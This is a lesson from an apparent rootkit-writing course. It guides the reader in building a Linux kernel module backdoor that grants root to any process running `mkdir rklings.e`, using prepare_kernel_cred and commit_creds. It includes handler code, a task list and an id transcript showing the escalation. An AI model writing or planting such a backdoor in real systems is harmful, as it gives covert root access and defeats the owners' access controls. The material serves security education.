# Become root with a single mkdir

A rootkit needs privilege escalation. This lesson delivers it through the
simplest possible trigger: `mkdir rklings.e` makes the calling process root.

You will use a provided header, `rklings_hook.h`, that intercepts mkdir calls
for you. You do not need to understand how it works yet. You will open it in
L10 and rewrite it from scratch in L11. For now, it is a black box.

## The black box

Include the header and define your handler:

```c
#include "rklings_hook.h"

RK_ON_MKDIR(name) {
    if (strcmp(name, "rklings.e") == 0)
        return rk_escalate();
    return -ENOENT;
}
```

When a process runs `mkdir rklings.e`, the header intercepts the syscall,
extracts the path, and calls your handler. No real directory is created. The
return value becomes the syscall result: 0 means success, -ENOENT looks like
a normal "no such file" to the caller.

## Credential replacement

Linux tracks identity through `struct cred`. Every task has a pointer to its
current credentials. Published credentials are immutable. To change identity,
you prepare a new set, then publish it atomically.

`prepare_kernel_cred(&init_task)` allocates a new credential set copied from
the initial task: uid 0, gid 0, all capabilities, initial user namespace. This
is the complete root identity, not a partial copy.

`commit_creds(replacement)` publishes the new credentials as the calling
task's identity. It consumes the reference: do not use the pointer after
commit. Return `-ENOMEM` if `prepare_kernel_cred` returns NULL.

## Your task

Create `main.c` with:

1. A static `rk_escalate()` function that:
   - calls `prepare_kernel_cred(&init_task)` to allocate root credentials
   - returns `-ENOMEM` on failure
   - calls `commit_creds()` to publish them
   - returns the commit result

2. An `RK_ON_MKDIR(name)` handler that:
   - compares `name` against `"rklings.e"`
   - calls `rk_escalate()` on match
   - returns `-ENOENT` for anything else

3. `module_init` that calls `rk_hook_start()`
4. `module_exit` that calls `rk_hook_stop()`

## Verify

```sh
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ mkdir rklings.e
$ id
uid=0(root) gid=0(root) groups=0(root)
```
